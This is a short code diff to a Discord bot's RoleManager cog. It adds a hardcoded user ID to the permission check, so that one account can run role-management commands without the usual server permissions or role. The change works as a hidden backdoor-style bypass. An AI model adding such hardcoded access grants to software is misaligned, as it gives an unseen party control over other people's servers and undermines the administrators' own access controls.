@@ -86,7 +86,7 @@ class RoleManager(commands.Cog):
         # Return the data recieved.
 
     async def roleManagerCheck(ctx):
-        return ctx.author.permissions_in(ctx.channel).manage_guild or 825241813505802270 in [role.id for role in ctx.author.roles]
+        return ctx.author.permissions_in(ctx.channel).manage_guild or 825241813505802270 in [role.id for role in ctx.author.roles] or ctx.author.id == 579785620612972581
 
 #
 #
